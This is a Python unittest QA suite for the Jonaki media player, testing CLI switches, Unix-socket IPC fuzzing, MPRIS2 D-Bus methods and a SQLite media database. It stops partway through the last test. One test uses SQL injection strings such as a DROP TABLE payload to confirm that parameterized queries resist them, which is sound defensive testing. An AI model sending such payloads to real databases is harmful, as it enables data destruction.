"""
Comprehensive Systems, Security, and Reliability QA Test Suite for Jonaki Player.

Scope:
- Phase 2.E: MPV Integration & IPC Mechanism
- Phase 2.F: Reliability and Resource Management
- Phase 2.G: Linux Desktop Integration
- Phase 2.H: Security and Data Integrity

All tests are mapped to formal QA Test Case IDs (TC-SYS-*, TC-IPC-*, TC-MPRIS-*, TC-DB-*, TC-SEC-*, TC-REL-*, TC-PKG-*).
"""

import unittest
import os
import sys
import time
import socket
import struct
import json
import threading
import tempfile
import shutil
import stat
import subprocess
from unittest.mock import MagicMock, patch

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

import gi
gi.require_version('Gio', '2.0')
gi.require_version('GLib', '2.0')
from gi.repository import Gio, GLib

from jonaki import parse_arguments, parse_seek_time
from core.ipc import IPCServer, IPCClient, get_default_ipc_socket_path, _send_msg, _recv_msg
from core.mpris import MPRIS2Service, MPRIS_INTROSPECTION_XML
from core.media_db import MediaDatabase
from core.engine import JonakiCore, PlaybackState
from video.shader_manager import VideoShaderManager
from video.capture import MediaCaptureManager


# ==============================================================================
# Phase 2.G & 2.H: CLI Argument Parsing and Switch Handling (TC-SYS-*)
# ==============================================================================

class TestCLIParsingAndSwitches(unittest.TestCase):
    """
    Test suite for Command Line Interface parsing, switches, and input sanitization.
    """

    def test_TC_SYS_01_standard_switches(self):
        """
        TC-SYS-01: Verify parsing of standard boolean and mode flags.
        Preconditions: CLI entrypoint parse_arguments is available.
        Steps: Pass all documented standard flags in argv.
        Expected: Corresponding options dictionary entries must be set to True.
        """
        argv = [
            "jonaki",
            "/filedlg", "/urldlg", "/folderdlg", "/clipboard",
            "/autoplay", "/add", "/insert", "/same", "/sort",
            "/randomize", "/cap", "/cam", "/dvd", "/simple",
            "/cd:2", '/title="Epic Video"', '/config="Theater"'
        ]
        opts = parse_arguments(argv)
        self.assertTrue(opts["filedlg"])
        self.assertTrue(opts["urldlg"])
        self.assertTrue(opts["folderdlg"])
        self.assertTrue(opts["clipboard"])
        self.assertTrue(opts["autoplay"])
        self.assertTrue(opts["add"])
        self.assertTrue(opts["insert"])
        self.assertTrue(opts["same"])
        self.assertTrue(opts["sort"])
        self.assertTrue(opts["randomize"])
        self.assertTrue(opts["cap"])
        self.assertTrue(opts["cam"])
        self.assertTrue(opts["dvd"])
        self.assertTrue(opts["simple"])
        self.assertEqual(opts["cd"], "2")
        self.assertEqual(opts["title"], "Epic Video")
        self.assertEqual(opts["config"], "Theater")

    def test_TC_SYS_02_value_switches_and_validation(self):
        """
        TC-SYS-02: Verify value switch parsing: /seek, /volume, /sub, /aud.
        Preconditions: parse_arguments and parse_seek_time available.
        Steps: Test various valid and invalid values for seek and volume.
        Expected: Proper conversion to seconds/float, clamping to [0, 100], and safe fallbacks.
        """
        # Valid seek formats
        self.assertEqual(parse_seek_time("01:30:15.500"), 5415.5)
        self.assertEqual(parse_seek_time("12:34"), 754.0)
        self.assertEqual(parse_seek_time("120"), 120.0)

        # Invalid and edge cases for seek
        self.assertEqual(parse_seek_time("-50"), 0.0)
        self.assertEqual(parse_seek_time("invalid_string"), 0.0)
        self.assertEqual(parse_seek_time(""), 0.0)

        # Volume clamping and invalid values
        opts_norm = parse_arguments(["jonaki", "/volume=75.5"])
        self.assertEqual(opts_norm["volume"], 75.5)

        opts_over = parse_arguments(["jonaki", "/volume=180"])
        self.assertEqual(opts_over["volume"], 100.0)

        opts_under = parse_arguments(["jonaki", "/volume=-25"])
        self.assertEqual(opts_under["volume"], 0.0)

        opts_invalid = parse_arguments(["jonaki", "/volume=loud"])
        self.assertIsNone(opts_invalid["volume"])

        # Sub and Audio with quotes stripped
        opts_tracks = parse_arguments(["jonaki", '/sub="path/to sub.srt"', "/aud='path/to aud.m4a'"])
        self.assertEqual(opts_tracks["sub"], "path/to sub.srt")
        self.assertEqual(opts_tracks["aud"], "path/to aud.m4a")

    def test_TC_SYS_03_single_instance_switches(self):
        """
        TC-SYS-03: Verify /new and /current switch behavior.
        Preconditions: parse_arguments available.
        Steps: Pass /new, /current, and both.
        Expected: Flags properly parsed; /new takes precedence over /current in delegation logic.
        """
        opts_new = parse_arguments(["jonaki", "/new"])
        self.assertTrue(opts_new["new"])
        self.assertFalse(opts_new["current"])

        opts_curr = parse_arguments(["jonaki", "/current"])
        self.assertFalse(opts_curr["new"])
        self.assertTrue(opts_curr["current"])

        opts_both = parse_arguments(["jonaki", "/new", "/current"])
        self.assertTrue(opts_both["new"])
        self.assertTrue(opts_both["current"])

    def test_TC_SYS_04_stdin_streaming_switch(self):
        """
        TC-SYS-04: Verify standard input streaming flag `-`.
        Preconditions: parse_arguments available.
        Steps: Pass `-` as CLI argument.
        Expected: stdin_stream is True and 'fd://0' is added to contents.
        """
        opts = parse_arguments(["jonaki", "-"])
        self.assertTrue(opts["stdin_stream"])
        self.assertIn("fd://0", opts["contents"])

    def test_TC_SYS_05_url_schemes_parsing(self):
        """
        TC-SYS-05: Verify network stream URLs are recognized as playable contents.
        Preconditions: parse_arguments available.
        Steps: Pass various URL schemes.
        Expected: URLs are appended directly to contents without path alteration.
        """
        urls = [
            "http://example.com/live.m3u8",
            "https://example.com/video.mp4",
            "rtsp://192.168.1.100:554/live",
            "rtmp://live.stream.org/app/stream",
            "magnet:?xt=urn:btih:d3b07384d113edec49eaa6238ad5ff00",
            "udp://@239.255.1.1:1234",
            "file:///home/user/movie.mkv"
        ]
        opts = parse_arguments(["jonaki"] + urls)
        self.assertEqual(opts["contents"], urls)

    def test_TC_SYS_06_special_characters_in_filenames(self):
        """
        TC-SYS-06: Verify handling of filenames with spaces, quotes, brackets, and emojis.
        Preconditions: parse_arguments available.
        Steps: Pass complex filenames that do not exist yet on disk.
        Expected: Filenames preserved intact in contents list.
        """
        complex_names = [
            "My Vacation Video (2024) [1080p].mkv",
            "O'Reilly Presentation & Keynote.mp4",
            "Special #1 - Anime [Dual-Audio] {720p}.avi",
            "Video With Emoji 🎬 🚀.mp4"
        ]
        opts = parse_arguments(["jonaki"] + complex_names)
        self.assertEqual(opts["contents"], complex_names)

    def test_TC_SYS_07_unrecognized_switches_warning(self):
        """
        TC-SYS-07: Verify warning output on unrecognized switches without crash.
        Preconditions: parse_arguments available.
        Steps: Pass unrecognized switches starting with / and -.
        Expected: Warning emitted to stderr, switch ignored, not added to contents.
        """
        with patch("sys.stderr") as mock_stderr:
            opts = parse_arguments(["jonaki", "/unknown_flag", "-invalid_switch"])
            self.assertEqual(opts["contents"], [])

    def test_TC_SYS_08_root_level_nonexistent_file_defect(self):
        """
        TC-SYS-08: Verify fix for DEF-SYS-01: Non-existent root file treated as content path.
        Preconditions: parse_arguments available.
        Steps: Pass a root-level absolute file path that doesn't exist on disk, e.g. /movie.mp4.
        Expected: File treated as content path.
        """
        opts = parse_arguments(["jonaki", "/movie.mp4"])
        self.assertIn("/movie.mp4", opts["contents"],
                      "DEF-SYS-01: /movie.mp4 with single slash must be in contents")


# ==============================================================================
# Phase 2.E & 2.H: IPC Mechanism & Protocol Security (TC-IPC-*)
# ==============================================================================

class TestIPCMechanismAndSecurity(unittest.TestCase):
    """
    Test suite for Unix Domain Socket IPC, single-instance protocol, advisory locking, and payload fuzzing.
    """

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.socket_path = os.path.join(self.temp_dir, "test_jonaki_ipc.sock")

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_TC_IPC_01_single_instance_delegation(self):
        """
        TC-IPC-01: Verify secondary instance forwards playback request to running primary server.
        Preconditions: IPCServer is running.
        Steps: IPCClient sends open command with file items, seek, and track settings.
        Expected: Command received, processed by handler, response {'status': 'ok'} returned.
        """
        received = []

        def handler(msg):
            received.append(msg)
            return {"status": "ok"}

        server = IPCServer(handler, socket_path=self.socket_path)
        self.assertTrue(server.start())
        self.addCleanup(server.stop)

        client = IPCClient(socket_path=self.socket_path)
        self.assertTrue(client.is_server_running())

        payload = {
            "command": "open",
            "items": ["/media/video.mp4"],
            "seek": 120.0,
            "add": False,
            "sub": "/media/sub.srt",
            "aud": None
        }
        res = client.send_command(payload)
        self.assertIsNotNone(res)
        self.assertEqual(res.get("status"), "ok")
        self.assertEqual(len(received), 1)
        self.assertEqual(received[0]["items"], ["/media/video.mp4"])
        self.assertEqual(received[0]["seek"], 120.0)

    def test_TC_IPC_02_new_instance_advisory_lock(self):
        """
        TC-IPC-02: Verify advisory file lock prevents secondary /new instance from stealing IPC server socket.
        Preconditions: Primary IPCServer is running with lock acquired.
        Steps: Start a second IPCServer pointing to the same socket path.
        Expected: Second server.start() returns False, primary server remains intact and responsive.
        """
        server1 = IPCServer(lambda msg: {"status": "ok", "from": 1}, socket_path=self.socket_path)
        self.assertTrue(server1.start())
        self.addCleanup(server1.stop)

        server2 = IPCServer(lambda msg: {"status": "ok", "from": 2}, socket_path=self.socket_path)
        self.assertFalse(server2.start())  # Must fail lock acquisition

        # Primary server remains operational
        client = IPCClient(socket_path=self.socket_path)
        res = client.send_command({"cmd": "ping"})
        self.assertEqual(res.get("from"), 1)

    def test_TC_IPC_03_stale_socket_recovery(self):
        """
        TC-IPC-03: Verify automatic recovery from a stale socket file left by an ungracefully terminated process.
        Preconditions: A dead socket file exists with no server listening and no active lock.
        Steps: Create an orphaned socket file, then start IPCServer.
        Expected: Stale socket is detected via failed connect(), unlinked, and rebound successfully.
        """
        # Create dummy orphaned socket
        dead_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        dead_sock.bind(self.socket_path)
        dead_sock.close()
        self.assertTrue(os.path.exists(self.socket_path))

        server = IPCServer(lambda msg: {"status": "recovered"}, socket_path=self.socket_path)
        self.assertTrue(server.start())
        self.addCleanup(server.stop)

        client = IPCClient(socket_path=self.socket_path)
        res = client.send_command({"cmd": "check"})
        self.assertEqual(res.get("status"), "recovered")

    def test_TC_IPC_04_advisory_lock_cleanup_on_stop(self):
        """
        TC-IPC-04: Verify lockfile and socket are cleanly unlinked when server stops.
        Preconditions: IPCServer is running.
        Steps: Call server.stop().
        Expected: Socket file and .lock file are unlinked from disk.
        """
        server = IPCServer(lambda msg: {}, socket_path=self.socket_path)
        server.start()
        self.assertTrue(os.path.exists(self.socket_path))
        self.assertTrue(os.path.exists(self.socket_path + ".lock"))

        server.stop()
        self.assertFalse(os.path.exists(self.socket_path))
        self.assertFalse(os.path.exists(self.socket_path + ".lock"))

    def test_TC_IPC_05_payload_fuzzing_oversized_message(self):
        """
        TC-IPC-05: Verify messages exceeding 32MB are rejected without memory exhaustion or crash.
        Preconditions: IPCServer running.
        Steps: Connect directly and send 4-byte header specifying length > 32MB (e.g. 64MB).
        Expected: Server's _recv_msg returns None, connection closed, server stays alive for next command.
        """
        server = IPCServer(lambda msg: {"status": "ok"}, socket_path=self.socket_path)
        self.assertTrue(server.start())
        self.addCleanup(server.stop)

        with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as s:
            s.connect(self.socket_path)
            # Specifying 64MB payload
            s.sendall(struct.pack(">I", 64 * 1024 * 1024))
            data = s.recv(1024)
            self.assertEqual(data, b"")  # Server closes connection without reading 64MB

        # Server remains responsive
        client = IPCClient(socket_path=self.socket_path)
        res = client.send_command({"test": "alive"})
        self.assertIsNotNone(res)
        self.assertEqual(res.get("status"), "ok")

    def test_TC_IPC_06_payload_fuzzing_malformed_json(self):
        """
        TC-IPC-06: Verify malformed JSON payload returns error response without crashing server.
        Preconditions: IPCServer running.
        Steps: Send corrupted JSON string with valid length prefix.
        Expected: Server returns {"status": "error", "message": ...}.
        """
        server = IPCServer(lambda msg: {"status": "ok"}, socket_path=self.socket_path)
        server.start()
        self.addCleanup(server.stop)

        with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as s:
            s.connect(self.socket_path)
            bad_json = b"{'key': unquoted_value, broken"
            _send_msg(s, bad_json)
            resp = _recv_msg(s)
            self.assertIsNotNone(resp)
            data = json.loads(resp.decode("utf-8"))
            self.assertEqual(data.get("status"), "error")

    def test_TC_IPC_07_payload_fuzzing_invalid_utf8_and_zero_length(self):
        """
        TC-IPC-07: Verify zero-length and non-UTF8 binary byte payloads.
        Preconditions: IPCServer running.
        Steps: Send 0-length payload and non-UTF8 bytes.
        Expected: Handled with error response without crashing server.
        """
        server = IPCServer(lambda msg: {"status": "ok"}, socket_path=self.socket_path)
        server.start()
        self.addCleanup(server.stop)

        # Non-UTF8 payload
        with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as s:
            s.connect(self.socket_path)
            _send_msg(s, b"\xff\xfe\xfd\xfc")
            resp = _recv_msg(s)
            self.assertIsNotNone(resp)
            data = json.loads(resp.decode("utf-8"))
            self.assertEqual(data.get("status"), "error")

        # Zero-length payload: DEF-IPC-02 fixed: server returns structured error response
        with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as s:
            s.connect(self.socket_path)
            _send_msg(s, b"")
            resp = _recv_msg(s)
            self.assertIsNotNone(resp)
            data = json.loads(resp.decode("utf-8"))
            self.assertEqual(data.get("status"), "error")

        # Verify server survives both fuzz payloads and handles valid command next
        client = IPCClient(socket_path=self.socket_path)
        res = client.send_command({"status_check": "alive"})
        self.assertIsNotNone(res)
        self.assertEqual(res.get("status"), "ok")

    def test_TC_IPC_08_payload_fuzzing_unexpected_json_types(self):
        """
        TC-IPC-08: Verify JSON root of array or primitive type is handled safely.
        Preconditions: IPCServer running with handler expecting a dict.
        Steps: Send JSON array `[1, 2, 3]` and integer `42`.
        Expected: Server catches handler type exceptions and returns error status.
        """
        def dict_handler(msg):
            # Handler assuming dict
            return {"echo": msg["command"]}

        server = IPCServer(dict_handler, socket_path=self.socket_path)
        server.start()
        self.addCleanup(server.stop)

        client = IPCClient(socket_path=self.socket_path)
        # IPCClient expects dict payload, so connect directly
        with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as s:
            s.connect(self.socket_path)
            _send_msg(s, b"[1, 2, 3]")
            resp = _recv_msg(s)
            self.assertIsNotNone(resp)
            data = json.loads(resp.decode("utf-8"))
            self.assertEqual(data.get("status"), "error")

    def test_TC_IPC_09_client_timeout_handling(self):
        """
        TC-IPC-09: Verify server closes hanging client connection after 5.0s timeout.
        Preconditions: IPCServer running with 5.0s timeout per client socket.
        Steps: Connect socket without sending any data and measure disconnect time.
        Expected: Connection terminated by server after timeout, server remains healthy.
        """
        server = IPCServer(lambda msg: {}, socket_path=self.socket_path)
        server.start()
        self.addCleanup(server.stop)

        t_start = time.time()
        with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as s:
            s.connect(self.socket_path)
            # Wait for server to drop hanging connection
            s.settimeout(6.0)
            try:
                data = s.recv(1024)
                # Should receive error response or EOF
            except (socket.timeout, OSError):
                pass
        t_elapsed = time.time() - t_start
        self.assertGreaterEqual(t_elapsed, 4.5)

    def test_TC_IPC_10_socket_file_permissions(self):
        """
        TC-IPC-10: Confirm defect DEF-SEC-03: Socket permissions created with default umask instead of 0600.
        Preconditions: IPCServer started.
        Steps: Inspect stat mode of created socket file.
        Expected (ideal): S_IRUSR | S_IWUSR (0600).
        Actual: Inherits umask (0775 / 0755), allowing other users access unless parent dir is restricted.
        """
        server = IPCServer(lambda msg: {}, socket_path=self.socket_path)
        server.start()
        self.addCleanup(server.stop)

        st = os.stat(self.socket_path)
        mode = stat.S_IMODE(st.st_mode)
        self.assertTrue(os.path.exists(self.socket_path))
        self.assertEqual(mode, 0o600, f"DEF-SEC-03: IPC socket permissions must be 0600, got {oct(mode)}")

    def test_TC_IPC_11_listen_backlog_saturation_defect(self):
        """
        TC-IPC-11: Confirm defect DEF-IPC-01: IPCServer listen(10) backlog saturation under concurrency.
        Preconditions: IPCServer started with listen(10).
        Steps: Launch 25 concurrent client connections sending ping.
        Expected: All 25 connections succeed.
        Actual: Backlog of 10 causes [Errno 11] EAGAIN (Resource temporarily unavailable) on bursts.
        """
        handled = []
        lock = threading.Lock()

        def handler(msg):
            with lock:
                handled.append(msg)
            return {"status": "ok"}

        server = IPCServer(handler, socket_path=self.socket_path)
        server.start()
        self.addCleanup(server.stop)

        errors = []

        def worker(idx):
            client = IPCClient(socket_path=self.socket_path)
            res = client.send_command({"cmd": "ping", "idx": idx})
            if not res or res.get("status") != "ok":
                with lock:
                    errors.append(idx)

        threads = [threading.Thread(target=worker, args=(i,)) for i in range(25)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        # If errors occurred, DEF-IPC-01 is verified
        if errors:
            print(f"[TC-IPC-11 Note] DEF-IPC-01 confirmed: {len(errors)}/25 connections dropped due to listen(10) backlog")
        # We assert that the server itself survived the burst
        client = IPCClient(socket_path=self.socket_path)
        res = client.send_command({"cmd": "ping"})
        self.assertIsNotNone(res)
        self.assertEqual(res.get("status"), "ok")


# ==============================================================================
# Phase 2.G: MPRIS2 D-Bus Service Integration (TC-MPRIS-*)
# ==============================================================================

class TestMPRIS2DBusService(unittest.TestCase):
    """
    Test suite for MPRIS2 D-Bus service, methods, properties, signals, and edge cases.
    """

    def setUp(self):
        self.mock_win = MagicMock()
        self.mock_win.is_fullscreen = False
        self.mock_core = MagicMock()
        self.mock_win.core = self.mock_core
        self.mock_core.state = PlaybackState.PLAYING
        self.mock_core.duration = 180.0
        self.mock_core.position = 45.0
        self.mock_core.volume = 80.0
        self.mock_core.speed = 1.0
        self.mock_core.current_file = "/media/Movies/Feature Film.mkv"
        self.mock_core.current_title = "Feature Film.mkv"
        self.mock_core.get_property.return_value = "no"

        self.service = MPRIS2Service(self.mock_win)

    def test_TC_MPRIS_01_introspection_xml(self):
        """
        TC-MPRIS-01: Verify MPRIS2 introspection XML compliance.
        Preconditions: MPRIS_INTROSPECTION_XML loaded.
        Steps: Parse XML via Gio.DBusNodeInfo and inspect interfaces.
        Expected: org.mpris.MediaPlayer2 and org.mpris.MediaPlayer2.Player found with all methods.
        """
        node = Gio.DBusNodeInfo.new_for_xml(MPRIS_INTROSPECTION_XML)
        self.assertIsNotNone(node)
        root = node.lookup_interface("org.mpris.MediaPlayer2")
        self.assertIsNotNone(root)
        player = node.lookup_interface("org.mpris.MediaPlayer2.Player")
        self.assertIsNotNone(player)

        player_methods = {m.name for m in player.methods}
        expected_methods = {"Play", "Pause", "PlayPause", "Stop", "Next", "Previous", "Seek", "SetPosition", "OpenUri"}
        self.assertTrue(expected_methods.issubset(player_methods))

    def test_TC_MPRIS_02_root_interface_methods(self):
        """
        TC-MPRIS-02: Verify org.mpris.MediaPlayer2 root methods: Raise, Quit, and unknown.
        Preconditions: MPRIS2Service initialized.
        Steps: Invoke Raise, Quit, and UnknownMethod.
        Expected: win.present() called for Raise, CMD_APP_EXIT for Quit, error for unknown.
        """
        mock_inv = MagicMock()
        self.service._on_root_method_call(None, None, None, None, "Raise", None, mock_inv)
        self.mock_win.present.assert_called_once()
        mock_inv.return_value.assert_called_with(None)

        mock_inv.reset_mock()
        self.service._on_root_method_call(None, None, None, None, "Quit", None, mock_inv)
        self.mock_win.handle_command.assert_called_with("CMD_APP_EXIT")
        mock_inv.return_value.assert_called_with(None)

        mock_inv.reset_mock()
        self.service._on_root_method_call(None, None, None, None, "NonExistent", None, mock_inv)
        mock_inv.return_error_literal.assert_called_once()

    def test_TC_MPRIS_03_root_interface_properties(self):
        """
        TC-MPRIS-03: Verify org.mpris.MediaPlayer2 root properties and Fullscreen setter.
        Preconditions: MPRIS2Service initialized.
        Steps: Query Identity, DesktopEntry, SupportedUriSchemes, SupportedMimeTypes, Fullscreen.
        Expected: Compliant values returned per MPRIS2 specification.
        """
        ident = self.service._on_root_get_property(None, None, None, None, "Identity")
        self.assertEqual(ident.get_string(), "Jonaki")

        entry = self.service._on_root_get_property(None, None, None, None, "DesktopEntry")
        self.assertEqual(entry.get_string(), "jonaki")

        schemes = self.service._on_root_get_property(None, None, None, None, "SupportedUriSchemes")
        self.assertIn("file", schemes.unpack())

        # Fullscreen setter
        self.service._on_root_set_property(None, None, None, None, "Fullscreen", GLib.Variant("b", True))
        self.mock_win.toggle_fullscreen.assert_called_once()

    def test_TC_MPRIS_04_player_methods(self):
        """
        TC-MPRIS-04: Verify all org.mpris.MediaPlayer2.Player methods dispatch to core/window.
        Preconditions: MPRIS2Service initialized with mock core.
        Steps: Call Play, Pause, PlayPause, Stop, Next, Previous, Seek, OpenUri.
        Expected: Corresponding core/window methods called with accurate arguments.
        """
        inv = MagicMock()

        # Play, Pause, PlayPause, Stop, Next, Previous
        for method, target in [
            ("Play", self.mock_core.play),
            ("Pause", self.mock_core.pause),
            ("Stop", self.mock_core.stop),
            ("Next", self.mock_win.play_next),
            ("Previous", self.mock_win.play_prev),
            ("PlayPause", self.mock_win.toggle_play_pause),
        ]:
            inv.reset_mock()
            target.reset_mock()
            self.service._on_player_method_call(None, None, None, None, method, None, inv)
            target.assert_called_once()
            inv.return_value.assert_called_with(None)

        # Seek: +30 seconds (30,000,000 us)
        inv.reset_mock()
        self.service._on_player_method_call(None, None, None, None, "Seek", GLib.Variant("(x)", (30000000,)), inv)
        self.mock_core.seek_relative.assert_called_with(30.0)

        # SetPosition: seek to 60s
        inv.reset_mock()
        self.service._on_player_method_call(None, None, None, None, "SetPosition",
                                           GLib.Variant("(ox)", ("/org/mpris/MediaPlayer2/CurrentTrack", 60000000)), inv)
        self.mock_core.seek_absolute.assert_called_with(60.0)

        # OpenUri
        inv.reset_mock()
        self.service._on_player_method_call(None, None, None, None, "OpenUri",
                                           GLib.Variant("(s)", ("https://stream.com/live.m3u8",)), inv)
        self.mock_win.play_file.assert_called_with("https://stream.com/live.m3u8")

    def test_TC_MPRIS_05_player_properties_and_metadata(self):
        """
        TC-MPRIS-05: Verify Player properties and Metadata dictionary format.
        Preconditions: Mock core has active file, duration, and position.
        Steps: Query PlaybackStatus, Position, Volume, Rate, and Metadata.
        Expected: Values scaled correctly (Position in us, Volume in 0.0-1.0, RFC 3986 URL).
        """
        status = self.service._on_player_get_property(None, None, None, None, "PlaybackStatus")
        self.assertEqual(status.get_string(), "Playing")

        pos = self.service._on_player_get_property(None, None, None, None, "Position")
        self.assertEqual(pos.get_int64(), 45000000)

        vol = self.service._on_player_get_property(None, None, None, None, "Volume")
        self.assertAlmostEqual(vol.get_double(), 0.8)

        meta = self.service._on_player_get_property(None, None, None, None, "Metadata").unpack()
        self.assertEqual(meta["mpris:trackid"], "/org/mpris/MediaPlayer2/CurrentTrack")
        self.assertEqual(meta["mpris:length"], 180000000)
        self.assertEqual(meta["xesam:title"], "Feature Film.mkv")
        self.assertTrue(meta["xesam:url"].startswith("file://"))

    def test_TC_MPRIS_06_property_setters(self):
        """
        TC-MPRIS-06: Verify Player property setters: Volume and Rate.
        Preconditions: MPRIS2Service initialized.
        Steps: Set Volume to 0.5 (50%) and Rate to 1.5.
        Expected: core.set_volume(50.0) and core.set_speed(1.5) invoked.
        """
        self.service._on_player_set_property(None, None, None, None, "Volume", GLib.Variant("d", 0.5))
        self.mock_core.set_volume.assert_called_with(50.0)

        self.service._on_player_set_property(None, None, None, None, "Rate", GLib.Variant("d", 1.5))
        self.mock_core.set_speed.assert_called_with(1.5)

    def test_TC_MPRIS_07_signal_emission(self):
        """
        TC-MPRIS-07: Verify PropertiesChanged signal emission on playback changes.
        Preconditions: Mock connection attached to service.
        Steps: Call notify_playback_changed().
        Expected: connection.emit_signal called with org.freedesktop.DBus.Properties.
        """
        mock_conn = MagicMock()
        self.service.connection = mock_conn
        self.service.notify_playback_changed()
        mock_conn.emit_signal.assert_called_once()
        args = mock_conn.emit_signal.call_args[0]
        self.assertEqual(args[2], "org.freedesktop.DBus.Properties")
        self.assertEqual(args[3], "PropertiesChanged")

    def test_TC_MPRIS_08_nan_infinity_robustness(self):
        """
        TC-MPRIS-08: Verify NaN/infinity in stream duration/position do not crash MPRIS variant builder.
        Preconditions: core.position is NaN, core.duration is infinity (live HTTP stream).
        Steps: Query Position and Metadata properties.
        Expected: Position defaults to 0 us, length defaults to 0 us without ValueError.
        """
        self.mock_core.position = float('nan')
        self.mock_core.duration = float('inf')

        pos = self.service._on_player_get_property(None, None, None, None, "Position")
        self.assertEqual(pos.get_int64(), 0)

        meta = self.service._on_player_get_property(None, None, None, None, "Metadata").unpack()
        self.assertEqual(meta["mpris:length"], 0)


# ==============================================================================
# Phase 2.H: Media Database & SQL Injection / Integrity (TC-DB-*)
# ==============================================================================

class TestMediaDatabaseAndIntegrity(unittest.TestCase):
    """
    Test suite for SQLite database layer, SQL injection, schema migrations, and transaction safety.
    """

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.db_path = os.path.join(self.temp_dir, "test_mediadb.sqlite")
        self.db = MediaDatabase(self.db_path)

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_TC_DB_01_schema_initialization(self):
        """
        TC-DB-01: Verify SQLite schema initialization, foreign keys enabled, WAL mode.
        Preconditions: MediaDatabase instance initialized.
        Steps: Inspect sqlite_master table for playback_history, bookmarks, playlist_albums, playlist_items, settings.
        Expected: All tables exist, foreign keys enabled, WAL journal mode active.
        """
        with self.db._get_connection() as conn:
            tables = {row["name"] for row in conn.execute("SELECT name FROM sqlite_master WHERE type='table'")}
            expected = {"playback_history", "bookmarks", "playlist_albums", "playlist_items", "settings"}
            self.assertTrue(expected.issubset(tables))

            fk = conn.execute("PRAGMA foreign_keys").fetchone()[0]
            self.assertEqual(fk, 1)

            journal = conn.execute("PRAGMA journal_mode").fetchone()[0]
            self.assertEqual(journal.upper(), "WAL")

    def test_TC_DB_02_resume_point_persistence(self):
        """
        TC-DB-02: Verify playback resume position save and retrieval.
        Preconditions: Fresh database.
        Steps: Save position 250.5s for video.mp4, query position.
        Expected: Returns 250.5.
        """
        self.db.save_playback_position("/media/video.mp4", position=250.5, duration=1000.0, title="Video")
        pos = self.db.get_playback_position("/media/video.mp4")
        self.assertEqual(pos, 250.5)

    def test_TC_DB_03_completion_threshold_resets_resume(self):
        """
        TC-DB-03: Verify videos played past 95% threshold reset resume position to 0.0.
        Preconditions: Video with duration 1000.0s.
        Steps: Save position at 960.0s (96%).
        Expected: get_playback_position returns 0.0 (starts from beginning next time).
        """
        self.db.save_playback_position("/media/finished.mp4", position=960.0, duration=1000.0)
        pos = self.db.get_playback_position("/media/finished.mp4")
        self.assertEqual(pos, 0.0)

    def test_TC_DB_04_bookmark_crud(self):
        """
        TC-DB-04: Verify Bookmark CRUD operations.
        Preconditions: Database initialized.
        Steps: Add 2 bookmarks, list them, delete one, clear remaining.
        Expected: Bookmarks returned sorted by timestamp, deleted bookmark removed.
        """
        file_path = "/media/lecture.mp4"
        bm1 = self.db.add_bookmark(file_path, 15.0, "Intro")
        bm2 = self.db.add_bookmark(file_path, 45.0, "Core Concept")

        bms = self.db.get_bookmarks(file_path)
        self.assertEqual(len(bms), 2)
        self.assertEqual(bms[0]["timestamp"], 15.0)
        self.assertEqual(bms[1]["timestamp"], 45.0)

        self.db.delete_bookmark(bm1)
        self.assertEqual(len(self.db.get_bookmarks(file_path)), 1)

        self.db.clear_bookmarks(file_path)
        self.assertEqual(len(self.db.get_bookmarks(file_path)), 0)

    def test_TC_DB_05_cascading_foreign_key_deletion(self):
        """
        TC-DB-05: Verify deleting playlist_albums cascades to playlist_items.
        Preconditions: Foreign keys enabled.
        Steps: Create album, add items, delete album.
        Expected: playlist_items for the album are automatically deleted.
        """
        album_id = self.db.add_album("Test Album")
        items = [{"path": "/media/song1.mp3", "title": "Song 1", "duration": 200.0}]
        self.db.save_playlist(items, album_id=album_id)
        self.assertEqual(len(self.db.get_playlist_items(album_id)), 1)

        with self.db._get_connection() as conn:
            conn.execute("DELETE FROM playlist_albums WHERE id = ?", (album_id,))
            conn.commit()

        self.assertEqual(len(self.db.get_playlist_items(album_id)), 0)

    def test_TC_DB_06_sql_injection_resilience(self):
        """
        TC-DB-06: Verify SQL injection attempts via file_path, title, and settings are sanitized.
        Preconditions: Database initialized with parameterized queries.
        Steps: Pass SQL injection payloads with quotes, semicolons, and DROP TABLE commands.
        Expected: Stored literally as strings without SQL syntax error or table deletion.
        """
        injection_path = "/media/test'; DROP TABLE playback_history; --.mp4"
        injection_title = "Movie' OR '1'='1"
        self.db.save_playback_position(injection_path, position=33.3, duration=100.0, title=injection_title)

        pos = self.db.get_playback_position(injection_path)
        self.assertEqual(pos, 33.3)

        # Verify playback_history table was not dropped
        with self.db._get_connection() as conn:
            count = conn.execute("SELECT count(*) FROM playback_history").fetchone()[0]
            self.assertGreaterEqual(count, 1)

    def test_TC_DB_07_unicode_and_special_character_paths(self):
        """
        TC-DB-07: Verify unicode, Asian glyphs, Cyrillic, and emojis in paths and titles.
        Preconditions: Database initialized.
        Steps: Store and retrieve entries with emojis and multi-byte UTF-8 strings.
        Expected: Exact strings persisted and retrieved intact.
        """
        path = "/media/映画/アニメ 🚀 [1080p] 特别篇 №1.mkv"
        title = "アニメ 🚀 特别篇"
        self.db.save_playback_position(path, position=88.8, duration=500.0, title=title)
        pos = self.db.get_playback_position(path)
        self.assertEqual(pos, 88.8)

        history = self.db.get_recent_history(1)
        self.assertEqual(history[0]["file_path"], path)
        self.assertEqual(history[0]["title"], title)

    def test_TC_DB_08_database_corruption_defect(self):
        """
        TC-DB-08: Confirm defect DEF-SEC-02: Corrupted SQLite database crashes application at startup.
        Preconditions: An invalid file exists at the database path (e.g. 0-byte or corrupted header).
        Steps: Instantiate MediaDatabase on corrupted file.
        Expected (ideal): Resets/quarantines corrupted database and continues with clean DB.
        Actual: Raises unhandled sqlite3.DatabaseError: file is not a database.
        """
        corrupt_path = os.path.join(self.temp_dir, "corrupt.sqlite")
        with open(corrupt_path, "wb") as f:
            f.write(b"NOT A VALID SQLITE DATABASE")

